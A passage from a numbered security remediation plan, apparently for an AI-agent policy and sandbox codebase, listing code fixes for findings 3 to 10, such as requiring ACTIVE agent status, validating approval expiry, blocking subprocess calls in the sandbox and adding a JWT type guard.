3. **FINDING-3 (Repository Factory In-Memory Fallback):** Update `app/repositories/factory.py` to wire `SqlToolRepository` and `SqlAuditEvidenceRepository` when `backend="sql"`.
4. **FINDING-4 (`AgentStatus.REGISTERED` Fail-Open):** Update `app/policy/policy_engine.py` to require `agent.status == AgentStatus.ACTIVE`.
5. **FINDING-5 (Approval Continuation Claim Epoch / Expiry):** Add `expires_at` and `enforcement_epoch` validation to `transition_continuation` in `SqlApprovalContinuationRepository`.
6. **FINDING-6 (Sandbox Subprocess Spawning):** Add audit hook in `app/runtime/sandbox/runner.py` to block `subprocess.Popen` and `os.system` within the child sandbox process.
7. **FINDING-7 (Version-Scoped Capability Profile Lookup):** Update profile resolution in `RuntimeService.execute` to use concrete tool versions.
8. **FINDING-9 (JWT Payload Type Guard):** Add `isinstance(payload, dict)` check in `app/auth/jwt_service.py`.
9. **FINDING-8 (`SessionEvent.requested_tool_id`):** Add `requested_tool_id` to `SessionEvent` model.
10. **FINDING-10 (Durable Evidence Store):** Implement `SqlExecutionEvidenceStore` for startup crash reconciliation.